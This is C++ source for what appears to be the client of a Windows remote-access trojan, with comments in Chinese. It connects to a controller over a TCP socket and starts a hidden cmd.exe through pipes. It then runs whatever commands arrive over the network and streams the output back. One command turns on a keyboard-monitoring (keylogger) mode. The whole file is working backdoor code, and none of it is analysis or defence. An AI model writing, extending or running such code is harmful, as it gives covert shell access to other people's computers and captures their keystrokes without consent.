#include "stdafx.h"
#include "work.h"
extern BOOL iskeyHook;
extern HANDLE myIn;
extern  HANDLE myOut;

SOCKET InitSock() {
	WSAData wsaData;
	WSAStartup(0x0202, &wsaData);
	SOCKET Client = socket(AF_INET, SOCK_STREAM, 0);
	if (Client == INVALID_SOCKET)
		return INVALID_SOCKET;

	sockaddr_in addr = { 0 };
	addr.sin_family = AF_INET;
	addr.sin_port = htons(8848);
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	int res = connect(Client, (sockaddr*)&addr, sizeof(sockaddr_in));
	if (res == INVALID_SOCKET)
		return INVALID_SOCKET;

	return Client;

}


BOOL InitPipe(HANDLE* myin, HANDLE* myout, DWORD* prcessid ) {
	//创建于cmd通信的管道
	//本程序出口与cmd入口的管道
	HANDLE myOut;
	HANDLE cmdIn;
	//cmd的出口与本程序入口的管道
	HANDLE cmdOut;
	HANDLE myIn;

	SECURITY_ATTRIBUTES sa = {0};
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	//创建本程序出口与cmd入口的管道
	int res = CreatePipe(&cmdIn, &myOut, &sa, 0);
	if (!res)
		return FALSE;

	res = CreatePipe(&myIn, &cmdOut, &sa, 0);
	if (!res)
		return FALSE;

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = cmdIn;
	si.hStdOutput = cmdOut;
	res = CreateProcess(_T("C:\\Windows\\System32\\cmd.exe"),//进程路径
		NULL,//命令行参数
		NULL,//进程继承
		NULL,//线程继承
		TRUE,//是否继承句柄
		CREATE_NO_WINDOW,//创建模式
		NULL,//环境变量
		NULL,//工作路径
		&si,//启动信息
		&pi);//进程信息
	if (!res)
		return FALSE;
	*myin = myIn;
	*myout = myOut;
	*prcessid = pi.dwProcessId;
	
	return TRUE;

}

VOID cmd(HANDLE myIn, HANDLE myOut,SOCKET s,char* lpStr) {
	DWORD Len = strlen(lpStr);
	int i = 0;
	PackHeader PH;
	PH.type = eCmd;
	char wbuf[256] = {0};
	memcpy(wbuf, lpStr, Len);
	wbuf[Len] = '\n';
	wbuf[Len + 1] = '\0';

	DWORD numofwrite = 0;
	DWORD numofread = 0;

	
	while (1) {
		PH = { 0 };
		char Packbuf[256 + 8] = { 0 };
		char pipebuf[256] = { 0 };
		char rbuf[256] = { 0 };
		DWORD haveByte = 0;
		PeekNamedPipe(myIn, pipebuf, sizeof(pipebuf)-1, &haveByte, NULL, NULL);
		if (!haveByte)
			break;
		ReadFile(myIn, rbuf, sizeof(rbuf)-1, &numofread, NULL);
		PH.length = strlen(rbuf)+1;
		PH.type = eCmd;
		
		memcpy(Packbuf, &PH, sizeof(PackHeader));
		memcpy(Packbuf + sizeof(PackHeader), rbuf, PH.length);
		send(s, Packbuf, sizeof(PH), 0);
		send(s, Packbuf + sizeof(PH), PH.length, 0);
	}

	WriteFile(myOut, wbuf, strlen(wbuf), &numofwrite, NULL);

	while (1) {
		
		PH = { 0 };
		char Packbuf[256 + 8] = { 0 };
		char pipebuf[256] = { 0 };
		char rbuf[256] = { 0 };
		DWORD haveByte = 0;
		if (!i) {
			Sleep(300);
		} else
			Sleep(50);
		PeekNamedPipe(myIn, pipebuf, sizeof(pipebuf)-1, &haveByte, NULL, NULL);
		if (!haveByte)
			break;
		ReadFile(myIn, rbuf, sizeof(rbuf)-1, &numofread, NULL);
		PH.type = eCmd;
		PH.length = strlen(rbuf) + 1;
		memcpy(Packbuf, &PH, sizeof(PackHeader));
		memcpy(Packbuf + sizeof(PackHeader), rbuf, PH.length);
		send(s, Packbuf, sizeof(PH), 0);
		send(s, Packbuf + sizeof(PH), PH.length, 0);
	}
	PH.type = -1;
	PH.length = -1;

	send(s, (char*)&PH, sizeof(PH), 0);
}

DWORD _stdcall proceThread(LPVOID p) {
	while (TRUE) {
		SOCKET s = (SOCKET)p;
		DWORD cmdcode = 0;
		char command[128] = { 0 };
		int n = recv(s, (char*)&cmdcode, sizeof(cmdcode), 0);

		switch (cmdcode)
		{
		case eCmd:{
					  iskeyHook = FALSE;
				   recv(s,(char*) command, sizeof(command)-1, 0);
				  
				   cmd(myIn, myOut, s, command);
		}break;
		case eKeyboard:{//键盘监控程序
						   iskeyHook = TRUE;
		}break;
		default:break;

		}

	}


}